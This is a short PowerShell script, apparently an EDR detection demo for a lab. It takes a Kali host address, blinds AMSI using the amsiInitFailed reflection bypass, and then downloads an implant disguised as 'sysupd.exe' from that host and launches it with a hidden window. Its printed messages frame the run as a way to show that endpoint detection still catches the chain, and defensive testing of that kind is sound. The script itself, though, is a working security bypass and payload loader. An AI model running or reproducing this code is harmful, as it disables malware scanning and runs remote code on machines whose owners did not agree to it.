param([Parameter(Mandatory=$true)][string]$Kali, [int]$Port = 8000)
Write-Host "[1] blinding AMSI in-session (expect a 4104 script-block event, not PROC-NOPS-AMSI)..."
$t = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$f = $t.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null, $true)
Write-Host "[2] delivering the implant anyway (expect the full SIG/launch/beacon chain)..."
IWR "http://${Kali}:${Port}/sysupd.exe" -OutFile "$env:TEMP\sysupd.exe"
Start-Process "$env:TEMP\sysupd.exe" -WindowStyle Hidden
Write-Host "point: AMSI is blind, your EDR is not - watch the LIVE panel"
